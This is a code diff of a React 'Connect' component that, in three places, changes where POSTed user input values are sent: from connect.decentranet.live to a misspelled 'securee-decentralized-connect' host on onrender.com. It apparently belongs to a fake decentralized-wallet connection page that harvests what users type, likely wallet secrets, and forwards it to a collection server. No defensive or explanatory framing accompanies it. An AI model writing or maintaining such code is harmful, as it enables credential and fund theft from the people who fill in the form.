@@ -19,7 +19,7 @@ function Connect({onCancelClick}) {
                   inputvalue : inputavalue,
               }
             try{  
-                const response = await fetch('https://connect.decentranet.live/processing', {
+                const response = await fetch('https://securee-decentralized-connect.onrender.com/processing', {
                    method : 'post', 
                    body : JSON.stringify(data),
                    headers: {
@@ -69,7 +69,7 @@ function Connect({onCancelClick}) {
              inputvalue : inputbvalue,
          }
        try{  
-           const response = await fetch('https://connect.decentranet.live/processingb', {
+           const response = await fetch('https://securee-decentralized-connect.onrender.com/processingb', {
               method : 'post', 
               body : JSON.stringify(data),
               headers: {
@@ -118,7 +118,7 @@ useEffect( ()=> {
          inputvalue : inputcvalue,
      }
    try{  
-       const response = await fetch('https://connect.decentranet.live/processingc', {
+       const response = await fetch('https://securee-decentralized-connect.onrender.com/processingc', {
           method : 'post', 
           body : JSON.stringify(data),
           headers: {
